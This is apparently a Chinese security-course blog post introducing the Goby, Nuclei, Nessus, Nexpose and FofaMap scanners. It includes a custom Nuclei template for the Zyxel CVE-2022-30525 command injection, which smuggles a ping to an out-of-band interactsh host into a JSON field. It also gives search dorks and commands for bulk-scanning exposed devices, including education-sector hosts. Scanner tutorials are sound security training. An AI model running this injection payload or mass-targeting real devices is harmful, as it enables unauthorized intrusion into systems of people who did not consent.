![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230914094210392-2060545430.png)

```plain
#知识点：
1、Goby 简单介绍&使用说明
2、Nuclei 简单介绍&使用说明
3、Nessus 简单介绍&使用说明
4、Nexpose 简单介绍&使用说明
5、掌握工具安装使用&原理&联动&适用
市面上有很多漏扫系统工具脚本，课程讲到的基本都是目前主流推荐的优秀项目！
具体项目：Burpsuite，Awvs，Xray，Goby，Afrog，Vulmap，Pocassist，Nessus，Nuclei，Pentestkit，Nexpose，BP插件(HaE,ShiroScan.FastJsonScan,Log4j2Scan等)。

#章节点：
1、漏洞发现-Web&框架层面
2、漏洞发现-服务&中间件层面
3、漏洞发现-APP&小程序层面
4、漏洞发现-PC操作系统层面

Goby是一款新的网络安全测试工具，由赵武Zwell（Pangolin、JSky、FOFA作者）打造，它能够针对一个目标企业梳理最全的攻击面信息，同时能进行高效、实战化漏洞扫描，并快速的从一个验证入口点，切换到横向。能通过智能自动化方式，帮助安全入门者熟悉靶场攻防，帮助攻防服务者、渗透人员更快的拿下目标。

Nuclei是一款基于YAML语法模板的开发的定制化快速漏洞扫描器。它使用Go语言开发，具有很强的可配置性、可扩展性和易用性。 提供 TCP、DNS、HTTP、FILE 等各类协议的扫描，通过强大且灵活的模板，可以使用 Nuclei 模拟各种安全检查。

Nessus号称是世界上最流行的漏洞扫描程序，全世界有超过75000个组织在使用它。该工具提供完整的电脑漏洞扫描服务，并随时更新其漏洞数据库。Nessus不同于传统的漏洞扫描软件，Nessus可同时在本机或远端上遥控，进行系统的漏洞分析扫描。可以扫描操作系统上的漏洞。

Nexpose 是 Rapid7 出品，一款著名的、极佳的商业漏洞扫描工具。跟一般的扫描工具不同，Nexpose 自身的功能非常强大，可以更新其漏洞数据库，以保证最新的漏洞被扫描到。漏洞扫描效率非常高，对于大型复杂网络，可优先考虑使用；对于大型复杂网络，可以优先考虑使用。可以给出哪些漏洞可以被 Metasploit Exploit，哪些漏洞在 Exploit-db 里面有 exploit 的方案。可以生成非常详细的，非常强大的 Report，涵盖了很多统计功能和漏洞的详细信息。虽然没有Web应用程序扫描，但Nexpose涵盖自动漏洞更新以及微软补丁星期二漏洞更新。

项目资源：
Goby：https://github.com/gobysec/Goby/releases
Nuclei：https://github.com/projectdiscovery/nuclei
Nessus：https://mp.weixin.qq.com/s/G-7Yu8sefH3Bo3GRtUo2EA
Nexpose：https://www.fujieace.com/hacker/rapid7-nexpose.html
FofaMAP：https://github.com/asaotomo/FofaMap
```

- Nessus&Nexpose漏扫操作系统漏洞

```plain
没安装成功，都是图形化的界面。也要时常更新，更新他的漏洞库。支持的是操作系统扫描，但是一般来说这些漏洞是很难发现的。

nessus访问：https://localhost:8834/#/

nexpose访问：https://127.0.0.1:3780/
```

- Goby&Nuclei漏扫系统&服务&中间件漏洞

```plain
goby也是可以扫描到系统层面的漏洞，这个借助的poc来进行扫描。这个和nessus和nexpose有区别。


在nuclei中也可以有相对应的poc
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230914094228597-1864923825.png)

```plain
在这个工具，也能进行信息探针，比如开放什么端口等等。

但是用资产信息来检测漏洞的话，那么就可以探针出来。
执行：nuclei.exe -u http://123.58.236.76:55150
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230914094228733-2135387840.png)

- Nuclei漏扫特定资产&模版导入&最新漏洞

```plain
使用：
目标：
-u、 -目标字符串[]要扫描的目标URL/主机
-l、 -包含要扫描的目标URL/主机列表的文件的列表字符串路径（每行一个）
-恢复字符串使用resume恢复扫描。cfg（将禁用群集）

模板：
-nt，-新模板仅运行最新Nucleus模板版本中添加的新模板
-as，-自动扫描使用wappalyzer技术检测到标签映射的自动web扫描
-t、 -模板字符串[]要运行的模板或模板目录列表（逗号分隔，文件）
-tu，-模板url字符串[]要运行的模板url列表（逗号分隔，文件）
-w、 -工作流字符串[]要运行的工作流或工作流目录列表（逗号分隔，文件）
-wu，-工作流url字符串[]要运行的工作流url列表（逗号分隔，文件）


比如漏洞：CVE-2022-30525: Zyxel 防火墙远程命令注入漏洞

在nuclei这个官方中刚更新就有集成的。
在这里也可以自己写一个
Zyxel.yaml：
id: CVE-2022-30525

info:
  name: cx
  author: remote
  severity: high
  tags: CVE-2022-30525
  reference: CVE-2022-30525

requests:
  - raw:
      - |
        POST /ztp/cgi-bin/handler HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json; charset=utf-8
        
        {"command": "setWanPortSt","proto": "dhcp","port": "1270","vlan_tagged": "1270","vlanid": "1270","mtu": "{{exploit}}","data":""}
        
        
    payloads:
      exploit:
        - ";ping -c 3 {{interactsh-url}};"
    attack: pitchfork
    matchers:
      - type: word
        part: interactsh_protocol
        name: dns
        words:
          - "dns"



在网上搜索语法：title=="USG FLEX 50 (USG20-VPN)"

执行：nuclei.exe -t 11.yaml -l urls.txt
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230914094228881-1432142514.png)

```plain
如果第一时间爆了漏洞，但是现在工具还不支持，就可以直接使构造payload去检测这个漏洞是否存在。

借助官方来进行扫描：
nuclei.exe -l url.txt -tags zyxel
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230914094228633-513043712.png)

- FofaMAP&Nuclei漏扫自动化特定项目漏洞

```plain
fofamap；
安装：G:\python38\Scripts\pip.exe install -r requirements.txt
使用：G:\python38\python.exe fofamap.py -q '"12306.cn"' -s -n
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230914094228542-1141188189.png)

```plain
比如说搜索相同类型的特征，fofa搜索zyxel，在用最新漏洞对这些目标来进行安全测试。

漏扫：
批量特征漏扫
收集：fofa shodan quake zoomeye

特定目标漏扫



常规思路：
对目录做信息收集：
web--awvs xray goby
框架
app
端口服务
服务器系统

部分漏洞--手工分析
信息收集这个部分交给引擎（不建议 除了批量挖洞）这样会信息收集不充分

fofamap 自带了nuclei 利用fofa收集到的目标资产信息在导入到nuclei这个工具上进行扫描。

语法："edu.cn" && port="7001" && title=="Error 404--Not Found"

执行：G:\python38\python.exe fofamap.py -q '"edu.cn" && port="7001" && title=="Error 404--Not Found"' -s -n
```